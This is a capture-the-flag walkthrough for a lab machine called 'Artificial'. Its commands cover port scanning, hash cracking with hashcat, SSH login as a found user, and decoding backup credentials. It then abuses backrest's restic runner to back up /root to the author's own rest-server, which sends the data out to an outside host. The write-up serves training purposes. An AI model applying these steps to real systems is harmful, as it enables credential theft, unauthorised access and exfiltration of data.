# Artificial - Live Machine

## Basic enumeration:

Did  
```bash
nmap -sV -sC -p- --min-rate 500 10.10.11.74
```

found a http server running which redirects to a artificial.htb site - so added the ip and site to /etc/hosts  
found a python http server which was serving the entire source code along with the .db file  

Dumped the user table and got the password hashes  
added all the pass hashes to `artifical_machine_pass.txt`  

ran  
```bash
hashcat -a 0 -m 0 artifical_machine_pass.txt /usr/share/wordlists/rockyou.txt.gz 
```

got some password  
tried a password for a user Gael in ssh login and I got in  

got the user flag  

---

Ran `whoami && id` - it returned:  
```
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

noticed the group “sysadm” - now  

check files with access level for sysadm:  
```bash
find / -group sysadm -ls 2>/dev/null
```

found `/var/backups/backrest_backup.tar.gz`  

extracted the file using:  
```bash
tar -xvf backrest_backup.tar.gz
```

(since it's only named as tar.gz it's not actually gzip)  

found a directory called `.config` and found a config file and saw a username and password in base64 format  

decoded the base64 using:  
```bash
base64 -d
```

ran  
```bash
hashcat -m 3200 clean_bcrypt.hash /usr/share/wordlists/rockyou.txt
```

cracked the password  

logged in to backrest  

---

Created a repo in backrest  
gave:
- repo URL as `/opt`
- password as `1234567`

after creating, tried running `help` command in the run command for repo  

---

In my machine I setup a simple rest-server using:  
```bash
rest-server --path /tmp/restic-data --listen :12345 --no-auth
```

- `--path` for where the repo should be  
- `--no-auth` to mention no auth needed to access  
- `--listen` for the port number  

---

then ran these commands in the repo in backrest:  
```bash
-r rest:http://<my-ip>:12345/myrepo init
-r rest:http://<my-ip>:12345/myrepo backup /root
```

got the backup and now in my machine I went to the path: `/tmp/restic-data`  

ran command:  
```bash
restic -r /tmp/restic-data/myrepo snapshots
```

this gets the backup file ID which was `68b523b8` — we will use this in the next command  

```bash
restic -r /tmp/restic-data/myrepo restore 68b523b8 --target ./restore
```

this will put the actual backup files inside the restore folder  

now we go to the restore folder and we get the root flag
